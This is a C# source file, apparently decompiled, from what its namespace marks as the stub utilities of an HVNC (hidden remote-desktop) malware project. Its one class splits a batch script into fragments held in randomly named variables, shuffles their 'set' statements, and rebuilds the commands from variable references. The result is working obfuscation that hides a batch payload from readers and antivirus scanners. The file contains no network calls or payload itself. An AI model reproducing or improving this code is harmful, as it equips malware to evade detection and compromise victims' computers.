using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;

namespace ShitarusPrivate.HVNC.StubUtils
{
    public class Obfuscator
    {
        [CompilerGenerated]
        private sealed class __c__DisplayClass0_0
        {
            public Random rng;

            internal int _GenCodeBat_b__0(string x)
            {
                return rng.Next();
            }
        }

        public static (string, string) GenCodeBat(string input, Random rng, int level = 5)
        {
            __c__DisplayClass0_0 _c__DisplayClass0_ = new __c__DisplayClass0_0();
            _c__DisplayClass0_.rng = rng;
            string text = string.Empty;
            string[] array = input.Split(new string[1] { Environment.NewLine }, StringSplitOptions.None);
            int num = 5;
            if (level > 1)
            {
                num -= level;
            }
            num *= 2;
            List<string> list = new List<string>();
            List<string[]> list2 = new List<string[]>();
            string[] array2 = array;
            foreach (string text2 in array2)
            {
                List<string> list3 = new List<string>();
                string text3 = string.Empty;
                bool flag = false;
                string text4 = text2;
                for (int j = 0; j < text4.Length; j++)
                {
                    char c = text4[j];
                    if (c == '%')
                    {
                        flag = !flag;
                        text3 += c;
                        continue;
                    }
                    if (c == ' ' && flag)
                    {
                        flag = false;
                        text3 += c;
                        continue;
                    }
                    if (!flag && text3.Length >= num)
                    {
                        list3.Add(text3);
                        flag = false;
                        text3 = string.Empty;
                    }
                    text3 += c;
                }
                list3.Add(text3);
                List<string> list4 = new List<string>();
                foreach (string item in list3)
                {
                    string text5 = Utils.RandomString(10, _c__DisplayClass0_.rng);
                    list.Add("set \"" + text5 + "=" + item + "\"");
                    list4.Add(text5);
                }
                list2.Add(list4.ToArray());
            }
            list = new List<string>(list.OrderBy(_c__DisplayClass0_._GenCodeBat_b__0));
            for (int k = 0; k < list.Count; k++)
            {
                text += list[k];
                text = ((_c__DisplayClass0_.rng.Next(0, 2) == 0 || k == list.Count - 1) ? (text + Environment.NewLine) : (text + " & "));
            }
            string text6 = string.Empty;
            foreach (string[] item2 in list2)
            {
                string[] array3 = item2;
                foreach (string text7 in array3)
                {
                    text6 = text6 + "%" + text7 + "%";
                }
                text6 += Environment.NewLine;
            }
            return (text.TrimEnd('\r', '\n'), text6.TrimEnd('\r', '\n'));
        }
    }
}
